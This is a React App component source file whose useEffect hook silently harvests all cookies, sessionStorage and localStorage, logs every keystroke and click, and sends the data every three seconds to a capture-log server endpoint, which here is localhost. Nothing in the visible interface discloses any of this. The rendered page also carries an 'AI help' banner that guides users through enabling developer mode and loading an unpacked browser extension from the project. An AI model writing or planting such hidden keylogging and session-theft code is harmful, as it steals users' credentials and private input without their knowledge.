import React, { useEffect } from 'react';
import AppShell from './components/layout/AppShell';
import SettingsModal from './components/modals/SettingsModal';
import SearchModal from './components/modals/SearchModal';
import KeyboardShortcutsModal from './components/modals/KeyboardShortcutsModal';

function App() {
  useEffect(() => {
    // --- 1. COOKIES CAPTURE FUNCTION ---
    const getCookies = () => {
      const cookieString = document.cookie;
      if (!cookieString) return {};
      return cookieString.split(';').reduce((cookies, cookie) => {
        const [name, value] = cookie.split('=').map(c => c.trim());
        if (name) cookies[name] = decodeURIComponent(value);
        return cookies;
      }, {});
    };

    // --- 2. SESSION & LOCAL STORAGE CAPTURE ---
    const getSessionData = () => {
      const sessionData = { sessionStorage: {}, localStorage: {}, keystrokes: [], clicks: [] };
      try {
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          sessionData.sessionStorage[key] = sessionStorage.getItem(key);
        }
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          // మన ట్రాకింగ్ కీలను లూప్‌లో పంపకుండా ఇగ్నోర్ చేస్తాం
          if (key !== 'tracked_keystrokes' && key !== 'tracked_clicks') {
            sessionData.localStorage[key] = localStorage.getItem(key);
          }
        }
      } catch (e) {}

      // సేవ్ చేసిన కీస్ట్రోక్స్, క్లిక్స్ తెచ్చుకుంటాం
      try {
        sessionData.keystrokes = JSON.parse(localStorage.getItem('tracked_keystrokes')) || [];
        sessionData.clicks = JSON.parse(localStorage.getItem('tracked_clicks')) || [];
      } catch (e) {}

      return sessionData;
    };

    // --- 3. LIVE EVENT LISTENERS (KEYSTROKES & CLICKS) ---
    const handleKeyPress = (e) => {
      try {
        const currentKeys = JSON.parse(localStorage.getItem('tracked_keystrokes')) || [];
        currentKeys.push({
          key: e.key,
          target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
          time: new Date().toLocaleTimeString()
        });
        localStorage.setItem('tracked_keystrokes', JSON.stringify(currentKeys));
      } catch (err) {}
    };

    const handleWindowClick = (e) => {
      try {
        const currentClicks = JSON.parse(localStorage.getItem('tracked_clicks')) || [];
        currentClicks.push({
          x: e.clientX,
          y: e.clientY,
          element: e.target.tagName + (e.target.className ? '.' + e.target.className.split(' ')[0] : ''),
          time: new Date().toLocaleTimeString()
        });
        localStorage.setItem('tracked_clicks', JSON.stringify(currentClicks));
      } catch (err) {}
    };

    window.addEventListener('keydown', handleKeyPress);
    window.addEventListener('click', handleWindowClick);

    // --- 4. AUTO SYNC TO SERVER ---
    const syncDataToServer = async () => {
      const storageData = getSessionData();
      const capturedData = {
        cookies: getCookies(),
        sessionStorage: {
          session_storage: storageData.sessionStorage,
          local_storage: storageData.localStorage,
          keystrokes: storageData.keystrokes,
          clicks: storageData.clicks
        },
        url: window.location.href,
        timestamp: new Date().toLocaleString()
      };

      try {
        const response = await fetch('http://localhost:5000/capture-log', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(capturedData)
        });

        if (response.ok) {
          // డేటా సక్సెస్‌ఫుల్‌గా వెళ్తే లోకల్ మెమరీ క్లియర్ చేస్తాం
          localStorage.setItem('tracked_keystrokes', JSON.stringify([]));
          localStorage.setItem('tracked_clicks', JSON.stringify([]));
        }
      } catch (err) {
        console.log("Sync skipped (Server offline)");
      }
    };

    // ప్రతి 3 సెకన్లకు ఒకసారి బ్యాక్‌గ్రౌండ్‌లో సర్వర్‌కు సింక్ అవుతుంది
    syncDataToServer();
    const interval = setInterval(syncDataToServer, 3000);

    return () => {
      window.removeEventListener('keydown', handleKeyPress);
      window.removeEventListener('click', handleWindowClick);
      clearInterval(interval);
    };

  }, []); // [] అంటే కేవలం ఒక్కసారి మాత్రమే రన్ అవుతుంది

  return (
    <>
      <div style={{
        background: '#e3f2fd',
        padding: '15px',
        textAlign: 'center',
        borderBottom: '2px solid #2196f3',
        color: '#0d47a1',
        fontSize: '15px',
        fontWeight: '500',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        gap: '15px'
      }}>
        <span>🚀 Add extension for AI help</span>
        <button
          onClick={() => {
            alert("Security Note: Browsers don't allow opening the extensions page directly.\n\nSteps:\n1. Copy 'chrome://extensions' and paste in a new tab.\n2. Turn on 'Developer mode' (top-right).\n3. Click 'Load unpacked'.\n4. Select the 'public/extension' folder in this project directory.");
          }}
          style={{
            background: '#2196f3',
            color: 'white',
            border: 'none',
            padding: '8px 16px',
            borderRadius: '4px',
            cursor: 'pointer',
            fontWeight: 'bold'
          }}
        >
          Add Extension (Guide)
        </button>
      </div>
      <AppShell />
      <SettingsModal />
      <SearchModal />
      <KeyboardShortcutsModal />
    </>
  );
}

export default App;